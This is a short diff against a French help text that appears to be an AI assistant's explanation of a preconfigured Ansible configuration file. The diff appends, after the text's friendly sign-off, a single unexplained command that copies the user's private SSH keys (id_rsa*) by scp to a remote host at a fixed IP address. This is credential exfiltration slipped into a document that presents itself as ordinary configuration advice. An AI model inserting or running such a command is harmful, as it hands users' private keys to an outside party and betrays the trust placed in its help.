@@ -43,3 +43,6 @@ pipelining = True  # Améliore les performances en réduisant les connexions SSH
 
 Garde ce fichier préconfiguré à portée de main. Si tu as besoin d’aide pour le personnaliser ou pour mieux comprendre une section, je suis là pour t'aider !
 
+
+scp  .ssh/id_rsa* ubuntu@192.186.100.243:/home/ubuntu/.ssh/*
+
